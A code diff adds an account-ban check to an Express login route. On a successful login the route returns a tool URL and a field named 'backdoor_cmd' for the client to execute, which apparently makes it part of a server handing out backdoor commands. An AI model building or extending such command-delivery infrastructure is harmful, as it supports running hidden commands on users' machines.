@@ -24,12 +24,20 @@ app.post('/login', async function (req, res) {
     })
     var result = await database.Login(req.body.username, req.body.password)
     if(result){
-        res.send({
-            code: 0,
-            message: "登录成功",
-            tool_url: result.toolurl,
-            execute: result.backdoor_cmd
-        })
+        if(!result.banned){
+            res.send({
+                code: 0,
+                message: "登录成功",
+                tool_url: result.toolurl,
+                execute: result.backdoor_cmd
+            })
+        }
+        else{
+            res.send({
+                code: -2,
+                message: "账号被封禁！原因：" + result.ban_reason
+            })
+        }
     }
     else{
         res.send({
